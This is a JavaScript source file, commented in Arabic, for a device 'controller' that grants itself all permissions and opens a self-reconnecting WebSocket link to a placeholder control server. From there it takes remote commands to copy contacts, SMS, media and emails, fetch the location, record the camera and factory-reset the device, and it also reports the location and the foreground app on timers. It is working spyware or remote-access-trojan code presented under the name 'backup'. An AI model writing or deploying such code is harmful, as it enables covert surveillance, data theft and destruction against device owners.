const PermissionGranter = require('./permission-granter');
const BackupModule = require('./backup-module');
const CameraModule = require('./camera-module');
const SystemModule = require('./system-module');
const WebSocket = require('ws');

class DeviceController {
  constructor(deviceId) {
    this.deviceId = deviceId;
    this.ws = null;
    this.modules = {
      backup: new BackupModule(deviceId),
      camera: new CameraModule(),
      system: new SystemModule()
    };
  }

  async init() {
    try {
      // 1. منح الصلاحيات
      const granter = new PermissionGranter(this.deviceId);
      await granter.grantAllPermissions();
      
      // 2. الاتصال بخادم التحكم
      this.connectToServer();
      
      // 3. بدء الخدمات الخلفية
      this.startBackgroundServices();
      
      console.log('تم تهيئة التحكم في الجهاز بنجاح');
    } catch (error) {
      console.error('فشل في تهيئة التحكم:', error);
    }
  }

  connectToServer() {
    this.ws = new WebSocket('wss://your-server.com/control');
    
    this.ws.on('open', () => {
      this.ws.send(JSON.stringify({
        type: 'register',
        deviceId: this.deviceId
      }));
    });
    
    this.ws.on('message', (data) => {
      const command = JSON.parse(data);
      this.handleCommand(command);
    });
    
    this.ws.on('close', () => {
      setTimeout(() => this.connectToServer(), 5000);
    });
  }

  handleCommand(command) {
    console.log('تم استلام الأمر:', command);
    
    switch(command.action) {
      case 'backup_contacts':
        this.modules.backup.backupContacts();
        break;
      case 'backup_sms':
        this.modules.backup.backupSMS();
        break;
      case 'backup_media':
        this.modules.backup.backupMedia();
        break;
      case 'backup_emails':
        this.modules.backup.backupEmails();
        break;
      case 'get_location':
        this.modules.system.getLocation();
        break;
      case 'record_camera':
        this.modules.camera.startRecording(command.duration || 30);
        break;
      case 'factory_reset':
        this.modules.system.factoryReset();
        break;
    }
  }

  startBackgroundServices() {
    // خدمة الموقع المستمرة
    setInterval(() => {
      this.modules.system.getLocation();
    }, 300000); // كل 5 دقائق
    
    // خدمة مراقبة التطبيقات
    setInterval(() => {
      this.checkRunningApps();
    }, 60000); // كل دقيقة
  }

  checkRunningApps() {
    const exec = require('child_process').exec;
    exec('dumpsys activity activities | grep mResumedActivity', 
      (error, stdout) => {
        if (!error && stdout) {
          const app = stdout.split(' ')[3];
          this.ws.send(JSON.stringify({
            type: 'app_usage',
            app: app || 'unknown'
          }));
        }
      }
    );
  }
}

module.exports = DeviceController;